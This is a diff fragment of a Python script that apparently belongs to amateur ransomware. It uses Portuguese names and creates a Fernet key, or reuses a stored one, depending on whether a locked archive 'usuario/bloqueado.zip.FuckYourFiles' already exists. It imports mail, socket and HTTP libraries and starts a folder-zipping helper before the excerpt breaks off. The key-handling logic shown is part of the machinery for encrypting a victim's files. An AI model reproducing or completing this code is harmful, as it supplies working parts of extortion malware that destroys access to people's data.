@@ -3,6 +3,7 @@ import shutil
 import smtplib
 import socket
 import sys
+from os.path import exists
 from pathlib import Path
 from time import sleep
 
@@ -13,27 +14,24 @@ from requests import get
 
 key = ''.encode()
 while True:
-    with open('config/wasEncripted.txt', 'r') as wasEncripted:
-        valida = wasEncripted.read()
+    if exists('usuario/bloqueado.zip.FuckYourFiles'):
+        with open('config/filekey.key', 'r') as filekey:
+            key = filekey.read()
+        print(key)
+        break
+    else:
 
-        if 'sim' in valida:
-            with open('config/filekey.key', 'r') as fileKey:
-                key = fileKey.read()
-                print(key)
-            break
-        else:
+        key = Fernet.generate_key()
 
-            key = Fernet.generate_key()
+        with open('config/filekey.key', 'wb') as filekey:
+            filekey.write(key)
 
-            with open('config/filekey.key', 'wb') as filekey:
-                filekey.write(key)
+        with open('config/filekey.key', 'rb') as filekey:
+            key = filekey.read()
 
-            with open('config/filekey.key', 'rb') as filekey:
-                key = filekey.read()
-
-            status = 'sim'.encode()
-            with open('config/wasEncripted.txt', 'wb') as wasEncripted:
-                wasEncripted.write(status)
+        status = 'sim'.encode()
+        with open('config/wasEncripted.txt', 'wb') as wasEncripted:
+            wasEncripted.write(status)
 
     def zip_folderPyzipper(folder_path, output_path):
         """Zip the contents of an entire folder (with that folder included
